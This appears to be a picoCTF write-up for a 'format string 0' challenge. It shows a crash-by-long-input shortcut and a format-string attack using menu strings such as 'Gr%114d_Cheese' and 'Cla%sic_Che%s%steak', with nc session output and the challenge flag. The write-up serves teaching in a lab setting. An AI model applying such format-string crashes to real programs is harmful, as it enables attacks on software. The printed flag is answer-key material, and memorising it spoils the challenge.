# format string 0

![image.png](images/image.png)

We can see that in the c code, there is a segmentation violation handler, that will print the flag when triggered

```c
void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}
```

So the easiest way to get the flag is to input a very large string, and it will trigger the segmentation violation handler, and will give the flag to us(I use `flag{test}` in the local flag.txt)

```bash
└─$ python2 -c 'print("a"*1000)'|./format-string-0 
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: There is no such burger yet!

flag{test}

```

However we should do it in the intended way. To do this, we can take a look at the `serve_patrick` function first

```c
void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
 .
 .
 .
 
	 char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}
```

The program will call the `server_bob`  function (the next phrase) if `count > 2 * BUFSIZE`, however, we must use the elements inside menu1.

It might sound weird at first, but if you use a GUI text editor, you can see the trick

![image.png](images/image%201.png)

 The `%114d` in `Gr%114d_Cheese` is highlighted. Why? 

It is related to something called [format specifier]([https://www.geeksforgeeks.org/c/format-specifiers-in-c/](https://www.geeksforgeeks.org/c/format-specifiers-in-c/)) in the C language. In this case, it will be a decimal value with 114 character long.

Using this, we can pass the first check and proceed to see the next stage

```c
void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
```

You can see in this case, the program will not call another function, so we should try to trigger the handler in this case

The option `Cla%sic_Che%s%steak` is a perfect choice, the printf function will try to access from the stack, which will be invalid

Here is how running in the instance looks like, you will see the `null` value in the `%s%s`, triggering the handler

```bash
└─$ nc mimas.picoctf.net xxxxx
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```

Flag: `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}`
